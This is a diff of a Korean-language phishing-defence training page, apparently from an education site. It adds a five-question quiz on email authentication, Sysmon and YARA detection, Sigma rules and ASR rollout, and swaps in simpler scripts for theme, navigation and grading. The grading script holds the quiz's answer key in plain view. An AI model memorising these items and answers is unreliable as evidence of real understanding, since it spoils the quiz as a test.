+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q1. SPF, DKIM, DMARC를 모두 적용했는데도 피싱 메일이 통과할 수 있는 경우는?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q1" value="1" class="mt-1 shrink-0"><span>SPF 레코드에 -all이 설정되지 않은 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q1" value="2" class="mt-1 shrink-0"><span>공격자가 Gmail 등 합법적 메일 서비스로 발송한 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q1" value="3" class="mt-1 shrink-0"><span>DMARC 정책이 p=reject인 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q1" value="4" class="mt-1 shrink-0"><span>이메일 본문이 HTML이 아닌 경우</span></label>
+                </div>
+
+                <!-- Q2 -->
+                <div class="space-y-3">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q2. Sysmon Event ID 1에서 스피어피싱 매크로 공격을 탐지하는 핵심 패턴은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q2" value="1" class="mt-1 shrink-0"><span>WINWORD.EXE가 cmd.exe/powershell.exe의 부모 프로세스인 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q2" value="2" class="mt-1 shrink-0"><span>explorer.exe가 WINWORD.EXE를 실행한 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q2" value="3" class="mt-1 shrink-0"><span>svchost.exe가 네트워크 연결을 생성한 경우</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q2" value="4" class="mt-1 shrink-0"><span>WINWORD.EXE가 파일을 읽은 경우</span></label>
+                </div>
+
+                <!-- Q3 -->
+                <div class="space-y-3">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q3. YARA 규칙에서 OLE2 문서의 매직 바이트를 탐지하는 올바른 표현은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q3" value="1" class="mt-1 shrink-0"><span>"OLE2" ascii nocase</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q3" value="2" class="mt-1 shrink-0"><span>{ D0 CF 11 E0 A1 B1 1A E1 } at 0</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q3" value="3" class="mt-1 shrink-0"><span>$magic = /OLE2.*document/</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q3" value="4" class="mt-1 shrink-0"><span>filesize &lt; 1MB and uint16(0) == 0xCFD0</span></label>
+                </div>
+
+                <!-- Q4 -->
+                <div class="space-y-3">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q4. Sigma 규칙과 YARA 규칙의 핵심 차이점은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q4" value="1" class="mt-1 shrink-0"><span>YARA는 파일을 분석하고, Sigma는 로그를 분석한다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q4" value="2" class="mt-1 shrink-0"><span>YARA는 JSON이고, Sigma는 XML이다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q4" value="3" class="mt-1 shrink-0"><span>Sigma는 Windows 전용이고, YARA는 플랫폼 독립적이다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q4" value="4" class="mt-1 shrink-0"><span>YARA는 무료이고, Sigma는 유료 라이선스가 필요하다</span></label>
+                </div>
+
+                <!-- Q5 -->
+                <div class="space-y-3">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q5. ASR 규칙의 권장 배포 순서로 올바른 것은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q5" value="1" class="mt-1 shrink-0"><span>즉시 Block 모드로 전체 배포</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q5" value="2" class="mt-1 shrink-0"><span>Audit 모드로 모니터링 → 오탐 확인 → Block 모드 전환</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q5" value="3" class="mt-1 shrink-0"><span>Warn 모드 상시 유지</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="q5" value="4" class="mt-1 shrink-0"><span>개발자 PC에만 Block, 나머지는 비활성</span></label>
+                </div>
+
+                <button onclick="checkQuiz()" class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl transition-colors text-sm">채점하기</button>
+                <div id="quiz-result" class="hidden"></div>
+            </div>
+        </section>
+
     </main>
     </div>
 
     <script>
-        /* ─── Navigation ─── */
-        function go(id){var el=document.getElementById(id);if(el)document.getElementById('main-scroll').scrollTo({top:el.offsetTop-40,behavior:'smooth'});}
-
-        /* ─── Theme Toggle ─── */
-        function toggleTheme(){var h=document.documentElement,i=document.getElementById('theme-icon');if(h.classList.contains('dark')){h.classList.remove('dark');h.classList.add('light');i.textContent='🌙';}else{h.classList.remove('light');h.classList.add('dark');i.textContent='☀️';}}
-
-        /* ─── Intersection Observer ─── */
-        var observerOptions={root:document.getElementById('main-scroll'),rootMargin:'0px 0px -40% 0px',threshold:0.1};
-        var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){entry.target.classList.remove('opacity-0','translate-y-10');entry.target.classList.add('opacity-100','translate-y-0');var id=entry.target.getAttribute('id');document.querySelectorAll('.nav-item').forEach(function(nav){nav.classList.remove('active');if(nav.getAttribute('data-target')===id)nav.classList.add('active');});}});},observerOptions);
-        document.querySelectorAll('.section-observe').forEach(function(s){observer.observe(s);});
-
-        /* ─── Utility ─── */
-        function shuffleArray(arr){var a=arr.slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
-
-        /* ═══════ Matching Game 0 ═══════ */
-        var matchItems_0=[{&#34;desc&#34;:&#34;발신 서버 IP가 허가된 목록에 있는지 검증&#34;,&#34;answer&#34;:&#34;SPF&#34;},{&#34;desc&#34;:&#34;이메일의 디지털 서명을 검증하여 변조 여부 확인&#34;,&#34;answer&#34;:&#34;DKIM&#34;},{&#34;desc&#34;:&#34;SPF/DKIM 실패 시 적용할 정책을 정의&#34;,&#34;answer&#34;:&#34;DMARC&#34;},{&#34;desc&#34;:&#34;실제 반송 주소를 나타내는 헤더 필드&#34;,&#34;answer&#34;:&#34;Return-Path&#34;},{&#34;desc&#34;:&#34;이메일을 발송한 원본 IP 주소를 기록&#34;,&#34;answer&#34;:&#34;X-Originating-IP&#34;}];
-        var matchTypes_0=[&#34;SPF&#34;,&#34;DKIM&#34;,&#34;DMARC&#34;,&#34;Return-Path&#34;,&#34;X-Originating-IP&#34;];
-        var matchScore_0=0;var matchAnswered_0=[];
-        function initMatchGame_0(){
-            matchScore_0=0;matchAnswered_0=[];
-            document.getElementById('match-score-0').textContent='0';
-            var container=document.getElementById('match-game-0');container.innerHTML='';
-            matchItems_0.forEach(function(item,idx){
-                var row=document.createElement('div');row.className='bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-slate-200 dark:border-slate-700';row.id='match-row-0-'+idx;
-                var descP=document.createElement('p');descP.className='text-sm text-cgray dark:text-slate-300 mb-3';descP.textContent=(idx+1)+'. '+item.desc;row.appendChild(descP);
-                var btnContainer=document.createElement('div');btnContainer.className='flex flex-wrap gap-2';
-                shuffleArray(matchTypes_0).forEach(function(type){var btn=document.createElement('button');btn.className='match-btn text-xs px-3 py-1.5 rounded-full border border-slate-300 dark:border-slate-600 bg-white dark:bg-slate-800 text-cgray dark:text-slate-300 font-mono cursor-pointer';btn.textContent=type;btn.onclick=function(){handleMatch_0(idx,type,btn);};btnContainer.appendChild(btn);});
-                row.appendChild(btnContainer);
-                var fb=document.createElement('div');fb.id='match-fb-0-'+idx;fb.className='mt-2 text-xs font-mono hidden';row.appendChild(fb);container.appendChild(row);
-            });
+        function toggleTheme() {
+            var html = document.documentElement;
+            html.classList.toggle('dark');
+            document.getElementById('theme-icon').textContent = html.classList.contains('dark') ? '☀️' : '🌙';
+            localStorage.setItem('gotroot_theme', html.classList.contains('dark') ? 'dark' : 'light');
         }
-        function handleMatch_0(idx,selected,btnEl){
-            if(matchAnswered_0.indexOf(idx)!==-1)return;matchAnswered_0.push(idx);
-            var fb=document.getElementById('match-fb-0-'+idx);fb.classList.remove('hidden');
-            var row=document.getElementById('match-row-0-'+idx);var btns=row.querySelectorAll('.match-btn');
-            if(selected===matchItems_0[idx].answer){matchScore_0++;document.getElementById('match-score-0').textContent=matchScore_0;fb.className='mt-2 text-xs font-mono text-green-600 dark:text-green-400';fb.textContent='✅ 정답! '+matchItems_0[idx].answer;btnEl.classList.add('correct');}
-            else{fb.className='mt-2 text-xs font-mono text-red-600 dark:text-red-400';fb.textContent='❌ 오답! 정답은 '+matchItems_0[idx].answer;btnEl.classList.add('wrong');btns.forEach(function(b){if(b.textContent===matchItems_0[idx].answer)b.classList.add('correct');});}
-            btns.forEach(function(b){b.onclick=null;b.style.cursor='default';});
+        if (localStorage.getItem('gotroot_theme') === 'dark') { document.documentElement.classList.add('dark'); document.getElementById('theme-icon').textContent = '☀️'; }
+
+        function go(id) {
+            var el = document.getElementById(id);
+            if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
         }
-        /* ═══════ Step Click 1 ═══════ */
-        var stepCurrent_1=0;
-        function handleStepClick_1(idx){
-            if(idx!==stepCurrent_1)return;
-            var container=document.getElementById('step-click-1');
-            var steps=container.querySelectorAll('.step-btn');
-            steps[idx].classList.add('active');
-            steps[idx].querySelector('.step-detail').classList.remove('hidden');
-            if(idx>0)steps[idx-1].classList.remove('active');
-            if(idx>0)steps[idx-1].classList.add('completed');
-            stepCurrent_1=idx+1;
-            if(stepCurrent_1=== 6){
-                steps[idx].classList.remove('active');steps[idx].classList.add('completed');
-                document.getElementById('step-result-1').classList.remove('hidden');
+
+        function checkQuiz() {
+            var answers = {q1:'2', q2:'1', q3:'2', q4:'1', q5:'2'};
+            var score = 0; var total = 5;
+            for (var key in answers) {
+                var sel = document.querySelector('input[name="'+key+'"]:checked');
+                if (!sel) { alert('모든 문제의 답을 선택해주세요.'); return; }
+                if (sel.value === answers[key]) score++;
+            }
+            var resultBox = document.getElementById('quiz-result');
+            resultBox.className = 'mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm';
+            resultBox.classList.remove('hidden');
+            if (score >= 4) {
+                resultBox.classList.add('bg-[#9DD9D2]/30','border','border-[#9DD9D2]','text-[#0f766e]','dark:text-[#9DD9D2]');
+                resultBox.innerHTML = '✅ ' + score + '/' + total + ' 정답! 탐지와 방어의 핵심을 잘 이해하고 있습니다.';
+            } else {
+                resultBox.classList.add('bg-red-100','border','border-red-400','text-red-700','dark:bg-red-900/50','dark:text-red-400');
+                resultBox.innerHTML = '❌ ' + score + '/' + total + ' 정답입니다. 틀린 부분의 챕터를 다시 복습해 보세요.';
             }
         }
-        /* ═══════ Code Fill 2 ═══════ */
-        var codeFillAnswers_2=[{&#34;id&#34;:&#34;blank1&#34;,&#34;answer&#34;:&#34;v=spf1&#34;,&#34;alternatives&#34;:[&#34;V=spf1&#34;,&#34;v=SPF1&#34;]},{&#34;id&#34;:&#34;blank2&#34;,&#34;answer&#34;:&#34;include:_spf.google.com&#34;,&#34;alternatives&#34;:[&#34;Include:_spf.google.com&#34;]},{&#34;id&#34;:&#34;blank3&#34;,&#34;answer&#34;:&#34;~all&#34;,&#34;alternatives&#34;:[&#34;-all&#34;]}];
-        function checkCodeFill_2(){
-            var inputs=document.querySelectorAll('#code-fill-2 .code-blank');
-            var correct=0;var total=inputs.length;
-            inputs.forEach(function(inp){
-                var blankId=inp.getAttribute('data-blank-id');
-                var ans=codeFillAnswers_2.find(function(a){return a.id===blankId;});
-                if(!ans)return;
-                var userVal=inp.value.trim().toLowerCase();
-                var correctVal=ans.answer.toLowerCase();
-                var alts=ans.alternatives.map(function(a){return a.toLowerCase();});
-                if(userVal===correctVal||alts.indexOf(userVal)!==-1){correct++;inp.classList.add('correct');inp.classList.remove('wrong');}
-                else{inp.classList.add('wrong');inp.classList.remove('correct');}
-            });
-            var r=document.getElementById('code-fill-result-2');r.classList.remove('hidden');
-            if(correct===total){r.className='mt-4 p-4 rounded text-sm font-mono shadow-sm bg-blue-100 border border-blue-400 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400';r.textContent='✅ '+correct+'/'+total+' 정답! 모든 빈칸을 올바르게 채웠습니다.';}
-            else{r.className='mt-4 p-4 rounded text-sm font-mono shadow-sm bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400';r.textContent='❌ '+correct+'/'+total+' 정답. 틀린 부분을 확인하고 다시 시도하세요.';}
-        }
-        function resetCodeFill_2(){
-            var inputs=document.querySelectorAll('#code-fill-2 .code-blank');
-            inputs.forEach(function(inp){inp.value='';inp.classList.remove('correct','wrong');});
-            document.getElementById('code-fill-result-2').classList.add('hidden');
-        }
 
-        /* ═══════ Final Quiz ═══════ */
-        function gradeFinalQuiz(){
-            var questions=document.querySelectorAll('#final-quiz .quiz-q');
-            var correct=0;var total=questions.length;var details=[];
-            questions.forEach(function(q,i){
-                var ans=q.getAttribute('data-correct');
-                var sel=q.querySelector('input[name="fq'+(i+1)+'"]:checked');
-                var labels=q.querySelectorAll('label');
-                var explanation=q.querySelector('.quiz-explanation');
-                if(explanation)explanation.classList.remove('hidden');
-                if(sel&&sel.value===ans){correct++;labels.forEach(function(l){if(l.querySelector('input').value===ans)l.classList.add('bg-green-50','dark:bg-green-900/20','border-green-400');});details.push('<div class="text-green-600 dark:text-green-400">✅ Q'+(i+1)+' 정답</div>');}
-                else{labels.forEach(function(l){if(sel&&l.querySelector('input').value===sel.value)l.classList.add('bg-red-50','dark:bg-red-900/20','border-red-400');if(l.querySelector('input').value===ans)l.classList.add('bg-green-50','dark:bg-green-900/20','border-green-400');});details.push('<div class="text-red-500">❌ Q'+(i+1)+' 오답'+(sel?'':' (미선택)')+'</div>');}
+        var observerOptions = { root: document.getElementById('main-scroll'), rootMargin: '0px 0px -40% 0px', threshold: 0.1 };
+        var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    entry.target.classList.remove('opacity-0','translate-y-10');
+                    entry.target.classList.add('opacity-100','translate-y-0');
+                    var id = entry.target.getAttribute('id');
+                    document.querySelectorAll('.nav-item').forEach(function(nav) {
+                        nav.classList.remove('active');
+                        if (nav.getAttribute('data-target') === id) nav.classList.add('active');
+                    });
+                }
             });
-            var pct=Math.round((correct/total)*100);
-            var grade=pct>=80?'우수':pct>=60?'양호':'재학습 권장';
-            var res=document.getElementById('quiz-result');res.classList.remove('hidden');
-            res.className='mt-6 p-4 rounded-lg text-sm font-mono shadow-sm '+(pct>=80?'bg-blue-100 border border-blue-400 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400':pct>=60?'bg-[#F4D06F]/30 border border-[#F4D06F] text-[#b45309] dark:text-[#F4D06F]':'bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400');
-            res.innerHTML='<div class="flex items-center gap-3 mb-3"><div class="text-3xl font-black '+(pct>=80?'text-green-500':pct>=60?'text-yellow-500':'text-red-500')+'">'+pct+'%</div><div><div class="font-bold text-sm">'+grade+' ('+correct+'/'+total+')</div><div class="text-xs opacity-70">중급 과정 종합 평가</div></div></div><div class="space-y-1">'+details.join('')+'</div>';
-        }
-
-        /* ─── Init ─── */
-        window.onload=function(){
-            initMatchGame_0();
-            setTimeout(function(){go('ch1');},100);
-        };
+        }, observerOptions);
+        document.querySelectorAll('.section-observe').forEach(function(s) { observer.observe(s); });
+        window.onload = function() { setTimeout(function() { go('ch1'); }, 100); };
     </script>
-    <script src="/edu/lab-link.js"></script>
-    <script src="/edu/progress-tracker.js"></script>
-    <script src="/edu/breadcrumb.js"></script>
+    </div>
+<script src="/edu/graphic-link.js"></script>
+<script src="/edu/progress-tracker.js"></script>
+<script src="/edu/breadcrumb.js"></script>
+    <script src="/wiki-button.js"></script>
 </body>
 </html>
